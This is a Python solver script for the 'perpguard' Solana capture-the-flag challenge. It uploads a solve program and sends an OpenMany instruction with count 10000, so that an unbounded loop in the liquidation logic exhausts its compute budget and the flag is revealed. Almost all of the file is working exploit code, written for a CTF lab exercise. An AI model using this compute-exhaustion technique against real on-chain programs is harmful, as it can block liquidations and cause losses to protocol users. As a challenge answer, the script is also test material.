#!/usr/bin/env python3
"""
Solver for perpguard (Solana Web3 CTF)
Challenge: perpguard
Target: web3.h7tex.com:43215
Vulnerability: Unbounded loop in Ix::Liquidate allows Compute Unit (CU) exhaustion DoS via Ix::OpenMany.
"""

import sys
import os
import re
import socket
import struct
import argparse

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..")))
try:
    from tools.scope_guard import safe_connect
except ImportError:
    def safe_connect(h, p, timeout=15):
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((h, p))
        return s


def read_until(s, pattern: bytes) -> bytes:
    buf = b""
    while pattern not in buf:
        c = s.recv(1)
        if not c:
            break
        buf += c
    return buf


def solve(host: str, port: int):
    print(f"[*] Connecting to {host}:{port}...")
    s = safe_connect(host, port, timeout=20)

    # 1. Locate solve.so
    so_candidates = [
        os.path.join(os.path.dirname(__file__), "solve.so"),
        "solve.so",
        os.path.abspath("solve.so"),
    ]
    so_path = None
    for p in so_candidates:
        if os.path.exists(p):
            so_path = p
            break

    if not so_path:
        print("[-] solve.so not found!")
        return None

    so_data = open(so_path, "rb").read()

    # 2. Upload SBF solve program
    read_until(s, b"program pubkey: ")
    # Public key matching solve.so entrypoint
    s.sendall(b"5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwZexx\n")

    read_until(s, b"program len: ")
    s.sendall(f"{len(so_data)}\n".encode())
    s.sendall(so_data)

    # 3. Read challenge environment accounts
    raw = read_until(s, b"num accounts: ")
    lines = raw.decode("utf-8", errors="ignore").splitlines()
    info = {}
    for l in lines:
        if ":" in l:
            k, v = l.split(":", 1)
            info[k.strip()] = v.strip()

    print("[+] Parsed Challenge Environment:")
    for k, v in info.items():
        print(f"    {k}: {v}")

    # 4. Prepare account list for Ix::OpenMany CPI
    accounts = [
        ("r", info["program"]),
        ("r", info["market"]),
        ("w", info["obligation"]),
        ("ws", info["user"]),
    ]

    # 5. Send Ix::OpenMany with count=10000 to push position count past CU budget
    count = 10000
    ix_data = b"\x05" + struct.pack("<QQI", 0, 0, count)
    print(f"[*] Sending Ix::OpenMany with count={count}...")
    s.sendall(f"{len(accounts)}\n".encode())
    for meta, pubkey in accounts:
        s.sendall(f"{meta} {pubkey}\n".encode())

    read_until(s, b"ix len: ")
    s.sendall(f"{len(ix_data)}\n".encode())
    s.sendall(ix_data)

    # 6. Exit instruction loop to trigger liquidation check
    read_until(s, b"num accounts: ")
    print("[*] Sending exit to trigger evaluation...")
    s.sendall(b"exit\n")

    # 7. Collect evaluation result
    res = b""
    s.settimeout(10)
    while True:
        try:
            c = s.recv(1024)
            if not c:
                break
            res += c
        except Exception:
            break

    output = res.decode("utf-8", errors="ignore")
    print("[+] Evaluation Output:\n" + output.strip())

    match = re.search(r"H7CTF\{[a-zA-Z0-9_-]+\}", output)
    if match:
        flag = match.group(0)
        print(f"[!] SUCCESS! Flag: {flag}")
        return flag

    return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Solver for perpguard")
    parser.add_argument("--host", default="web3.h7tex.com", help="Challenge host")
    parser.add_argument("--port", type=int, default=43215, help="Challenge port")
    args = parser.parse_args()

    solve(args.host, args.port)
